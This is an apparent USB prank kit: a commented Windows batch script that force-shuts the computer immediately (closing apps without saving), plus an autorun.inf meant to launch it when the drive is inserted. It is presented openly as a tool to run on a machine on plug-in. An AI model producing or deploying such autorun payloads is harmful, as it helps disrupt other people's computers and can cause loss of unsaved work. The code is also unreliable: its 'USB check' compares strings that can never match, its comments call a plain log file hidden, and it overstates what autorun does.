#shutdown.bat

@echo off
 REM This is a Windows batch script to shut down the system when run
 REM @echo off hides commands from displaying, making it silent

 REM Log start time to a hidden file on the USB for tracking
 echo Shutdown script started at %date% %time% > "log.txt"

 REM Check if script is running from a removable drive (USB)
 REM %CD% is the current directory; checks if it’s a drive letter like D:\
 if "%CD:~0,2%"=="%CD:~0,1%:" (
     REM If true, it’s likely a USB drive
     echo Running from USB at %CD% >> "log.txt"
 ) else (
     REM If not on USB, exit to avoid accidental runs elsewhere
     echo Not on USB, exiting >> "log.txt"
     exit /b
 )

 REM Delay for 2 seconds to simulate processing or ensure USB is fully mounted
 timeout /t 2 /nobreak >nul
 REM /nobreak prevents user interruption, >nul hides output

 REM Execute the shutdown command
 REM shutdown /s = shut down, /t 0 = immediately, /f = force close apps
 shutdown /s /t 0 /f
 REM This will power off the Windows system right away

 REM Log completion (won’t finish if shutdown works)
 echo Shutdown command sent at %date% %time% >> "log.txt"


=====================
autorun.inf 

[AutoRun]
 REM This section tells Windows what to do when the USB is inserted
 open=shutdown.bat
 REM Runs shutdown.bat automatically when USB is plugged in
 shell\open\command=shutdown.bat
 REM Sets the default "Open" action to run the batch file
 label=USB_Shutdown
 REM Names the USB drive "USB_Shutdown" in File Explorer


